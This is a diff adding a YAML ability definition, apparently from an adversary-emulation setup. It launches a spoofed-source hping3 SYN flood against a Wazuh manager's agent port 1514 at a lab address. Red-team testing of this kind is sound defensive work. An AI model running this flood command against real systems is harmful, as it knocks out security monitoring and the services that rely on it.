@@ -1,0 +1,33 @@
+- tactic: impact
+  technique_name: SYN flood
+  technique_id: TB003
+  name: Wazuh DoS attack
+  description: Start a SYN Flood on the Wazuh manager on TCP port 1514, that is used
+    in the communication with the agents. The SYN packets are sent from a spoofed
+    ip address (the wazuh one, in this case 192.168.2.23)
+  executors:
+  - name: sh
+    platform: linux
+    command: while true; do hping3 -S 192.168.2.23 -p 1514 -a 192.168.2.23 -s 1514
+      --flood; done
+    code: null
+    language: null
+    build_target: null
+    payloads: []
+    uploads: []
+    timeout: 300
+    parsers: []
+    cleanup: []
+    variations: []
+    additional_info: {}
+  requirements: []
+  privilege: ''
+  repeatable: false
+  buckets:
+  - defense-evasion
+  additional_info: {}
+  access: {}
+  singleton: false
+  plugin: ''
+  delete_payload: true
+  id: 4c848ee8-f3e4-49cc-bbf1-92a647786a26
